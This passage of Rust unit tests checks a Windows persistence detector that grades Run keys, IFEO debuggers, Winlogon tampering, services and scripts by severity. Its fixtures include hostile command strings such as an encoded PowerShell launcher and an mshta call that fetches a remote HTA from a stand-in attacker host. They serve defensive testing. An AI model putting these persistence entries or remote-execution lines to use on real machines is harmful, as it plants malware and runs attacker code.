        assert!(!details.contains("mechanism="), "no debug format: {details}");
    }

    #[test]
    fn run_key_details_format() {
        let now = Utc::now();
        let p = rec("run_key", Some(r"C:\Users\x\AppData\Local\Temp\updater.exe"), Some(now));
        let details = format_persist_details(&p);
        assert!(details.starts_with("Run 鍵:"), "must start with Run 鍵: {details}");
        assert!(details.contains("updater.exe"), "must contain binary name: {details}");
        assert!(!details.contains("mechanism="), "no debug format: {details}");
    }

    #[test]
    fn analyzer_finding_details_is_human_readable() {
        let now = Utc::now();
        let bad = Record::Persistence(PersistenceRecord {
            mechanism: "ifeo".into(),
            location: r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe".into(),
            value: Some("Debugger".into()),
            command: Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe".into()),
            binary_path: Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe".into()),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: Some(now),
        });
        let findings = PersistHeuristic.analyze(&[bad]).expect("analyze");
        assert_eq!(findings.len(), 1);
        let details = &findings[0].details;
        assert!(details.starts_with("IFEO"), "must start with IFEO: {details}");
        assert!(!details.contains("mechanism="), "must not use debug format: {details}");
    }

    // ── gate model (spec §4.2) ───────────────────────────────────────────────
    fn full_rec(
        mechanism: &str,
        value: Option<&str>,
        command: Option<&str>,
        binary_path: Option<&str>,
        signed: Option<bool>,
        last_write: Option<DateTime<Utc>>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism: mechanism.into(),
            location: format!("HKLM\\...\\{mechanism}"),
            value: value.map(String::from),
            command: command.map(String::from),
            binary_path: binary_path.map(String::from),
            binary_sha256: None,
            signed,
            signer: None,
            last_write,
        }
    }

    #[test]
    fn gate_s1a_winlogon_tamper_high_default_silent() {
        let now = Utc::now();
        let tampered = full_rec("winlogon", Some("Shell"), Some("explorer.exe,evil.exe"),
            None, None, None);
        let hits = evaluate_gate(&tampered, now);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::High);
        assert_eq!(hits[0].mitre, "T1547.004");
        let stock = full_rec("winlogon", Some("Shell"), Some("explorer.exe"),
            Some(r"C:\Windows\explorer.exe"), Some(true), Some(now));
        assert!(evaluate_gate(&stock, now).is_empty(), "stock winlogon must be inventory");
    }

    #[test]
    fn gate_s1b_ifeo_severity_by_target_trust() {
        let now = Utc::now();
        let evil = full_rec("ifeo", Some("Debugger"), Some(r"C:\Users\a\AppData\Roaming\d.exe"),
            Some(r"C:\Users\a\AppData\Roaming\d.exe"), Some(false), None);
        assert!(evaluate_gate(&evil, now).iter().any(|h| h.severity == Severity::High));
        let procexp = full_rec("ifeo", Some("Debugger"), Some(r"C:\Program Files\SysInternals\procexp.exe"),
            Some(r"C:\Program Files\SysInternals\procexp.exe"), Some(true), None);
        let hits = evaluate_gate(&procexp, now);
        assert_eq!(hits.len(), 1, "IFEO always gates");
        assert_eq!(hits[0].severity, Severity::Medium, "signed vendor target -> Medium");
    }

    #[test]
    fn gate_s2_unsigned_dropzone_high_but_signed_or_normal_path_silent() {
        let now = Utc::now();
        let evil = full_rec("run_key", Some("Upd"), Some(r"C:\Users\a\AppData\Roaming\e.exe"),
            Some(r"C:\Users\a\AppData\Roaming\e.exe"), Some(false), None);
        assert_eq!(evaluate_gate(&evil, now)[0].severity, Severity::High);
        // signed chrome autostart -> inventory
        let chrome = full_rec("run_key", Some("Chrome"),
            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"), Some(true), Some(now));
        assert!(evaluate_gate(&chrome, now).is_empty());
        // unsigned but in Program Files (admin-write) -> not S2
        let pf = full_rec("run_key", Some("V"), Some(r"C:\Program Files\V\v.exe"),
            Some(r"C:\Program Files\V\v.exe"), Some(false), None);
        assert!(evaluate_gate(&pf, now).is_empty());
    }

    #[test]
    fn gate_s3_masquerade_absolute_only() {
        let now = Utc::now();
        let fake = full_rec("service", None, Some(r"C:\ProgramData\svchost.exe"),
            Some(r"C:\ProgramData\svchost.exe"), None, None);
        assert!(evaluate_gate(&fake, now).iter().any(|h| h.mitre == "T1036.005"));
        let bare = full_rec("winlogon", Some("Shell"), Some("explorer.exe"), Some("explorer.exe"),
            None, None);
        // bare name: winlogon default -> no S1a; not absolute -> no S3
        assert!(evaluate_gate(&bare, now).is_empty());
    }

    #[test]
    fn gate_s4_needs_all_three_conditions() {
        let now = Utc::now();
        let recent = Some(now - Duration::days(2));
        let hit = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"), None, recent);
        assert_eq!(evaluate_gate(&hit, now)[0].severity, Severity::Medium);
        // signed -> no S4 (ASUS update-day services)
        let signed = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"), Some(true), recent);
        assert!(evaluate_gate(&signed, now).is_empty());
        // system path -> no S4 (per-user svchost instances)
        let sys = full_rec("service", None, Some(r"C:\Windows\System32\svchost.exe -k X"),
            Some(r"C:\Windows\System32\svchost.exe"), None, recent);
        assert!(evaluate_gate(&sys, now).is_empty());
        // old -> no S4
        let old = full_rec("service", None, Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"), None, Some(now - Duration::days(300)));
        assert!(evaluate_gate(&old, now).is_empty());
    }

    #[test]
    fn gate_s9_script_persistence_tiers() {
        let now = Utc::now();
        let enc = full_rec("run_key", Some("U"),
            Some("powershell.exe -NoP -Enc SQBFAFgA"), None, None, None);
        let h = evaluate_gate(&enc, now);
        assert_eq!(h[0].severity, Severity::High);
        let remote = full_rec("run_key", Some("U"),
            Some(r"mshta.exe https://evil.tld/x.hta"), None, None, None);
        assert_eq!(evaluate_gate(&remote, now)[0].severity, Severity::High);
        let local = full_rec("scheduled_task", None,
            Some(r"wscript.exe C:\Scripts\backup.vbs"), Some(r"C:\Windows\System32\wscript.exe"),
            Some(true), None);
        assert_eq!(evaluate_gate(&local, now)[0].severity, Severity::Low);
        // interpreter-in-vendor-name must NOT fire (substring guard)
        let studio = full_rec("run_key", Some("PS"),
            Some(r"C:\Program Files\PowerShell Studio\app.exe --serve"),
            Some(r"C:\Program Files\PowerShell Studio\app.exe"), Some(true), None);
        assert!(evaluate_gate(&studio, now).is_empty());
    }

    #[test]
    fn gate_service_and_runkey_existence_is_inventory() {
        let now = Utc::now();
        // The 25-Low class from the 2026-06-28 run: plain third-party service.
        let svc = full_rec("service", None, Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"), Some(true), Some(now - Duration::days(400)));
        assert!(evaluate_gate(&svc, now).is_empty());
        // The 13-Medium class: same service on update day (recent) — still inventory.
        let svc_recent = full_rec("service", None, Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"), Some(true), Some(now - Duration::days(2)));
        assert!(evaluate_gate(&svc_recent, now).is_empty());
    }

    #[test]
    fn escalate_caps_at_critical() {
        assert_eq!(escalate(Severity::Low), Severity::Medium);
        assert_eq!(escalate(Severity::Medium), Severity::High);
        assert_eq!(escalate(Severity::High), Severity::Critical);
        assert_eq!(escalate(Severity::Critical), Severity::Critical);
    }
}
